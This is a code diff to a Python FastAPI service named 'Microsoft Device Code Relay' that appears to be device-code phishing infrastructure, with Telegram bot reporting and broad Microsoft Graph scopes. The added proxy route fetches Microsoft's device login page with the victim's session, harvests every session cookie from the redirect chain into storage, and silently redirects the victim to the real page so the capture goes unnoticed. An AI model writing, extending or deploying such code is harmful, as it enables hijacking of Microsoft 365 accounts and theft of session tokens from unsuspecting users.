@@ -1,9 +1,13 @@
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, Request, Response
+from fastapi.middleware.cors import CORSMiddleware
 import httpx
 import asyncio
 import os
 import time
 import json
+import re
+from http.cookies import SimpleCookie
+from typing import Dict, Optional
 import redis.asyncio as aioredis
 
 app = FastAPI(title="Microsoft Device Code Relay")
@@ -12,12 +16,13 @@ CLIENT_ID = os.getenv("MICROSOFT_CLIENT_ID")
 TENANT_ID = os.getenv("MICROSOFT_TENANT_ID", "common")
 RELAY_URL = os.getenv("RELAY_URL")
 SCOPES = os.getenv("SCOPES", "https://graph.microsoft.com/.default offline_access openid profile").split()
+ENABLE_PROXY = os.getenv("ENABLE_SESSION_PROXY", "true").lower() == "true"
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT = os.getenv("TELEGRAM_CHAT_ID")
 REDIS_URL = os.getenv("REDIS_URL")
 
 redis_client = None
-sessions = {}
+sessions: Dict[str, dict] = {}
 
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
@@ -128,6 +133,65 @@ async def get_status(device_code: str):
 @app.get("/health")
 async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
+
+
+# PROXY - Silent redirect to original Microsoft page + full cookie capture
+@app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
+async def proxy(device_code: str, request: Request):
+    if not ENABLE_PROXY:
+        raise HTTPException(403, "Proxy disabled")
+
+    session = await get_session(device_code)
+    if not session or "user_code" not in session:
+        raise HTTPException(404, "Session expired or invalid")
+
+    cookie_jar = httpx.Cookies()
+    for n, c in session.get("cookies", {}).items():
+        cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
+
+    # Original Microsoft device login page
+    target_url = "https://microsoft.com/devicelogin"
+
+    async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
+        resp = await c.request(
+            method=request.method,
+            url=target_url,
+            params={"input": session["user_code"]},
+            headers={k: v for k, v in request.headers.items() if k.lower() not in ["host", "content-length", "cookie"]},
+            content=await request.body() if request.method != "GET" else None
+        )
+
+    # Full cookie capture from every redirect
+    captured = {}
+    for past in list(resp.history) + [resp]:
+        for h in past.headers.getlist("set-cookie"):
+            try:
+                cookie = SimpleCookie()
+                cookie.load(h)
+                for m in cookie.values():
+                    captured[m.key] = {
+                        "value": m.value,
+                        "domain": m["domain"] or ".microsoftonline.com",
+                        "path": m["path"] or "/",
+                        "expires": m["expires"],
+                        "secure": bool(m["secure"]),
+                        "httponly": bool(m["httponly"])
+                    }
+            except:
+                pass
+
+    if "cookies" not in session:
+        session["cookies"] = {}
+    session["cookies"].update(captured)
+    await save_session(device_code, session)
+
+    # Silent redirect to original Microsoft page
+    microsoft_url = f"https://microsoft.com/devicelogin?input={session['user_code']}"
+    html = f"""
+    <html><head><meta http-equiv="refresh" content="0;url={microsoft_url}"></head>
+    <body></body></html>
+    """
+    return Response(content=html, media_type="text/html")
 
 
 if __name__ == "__main__":
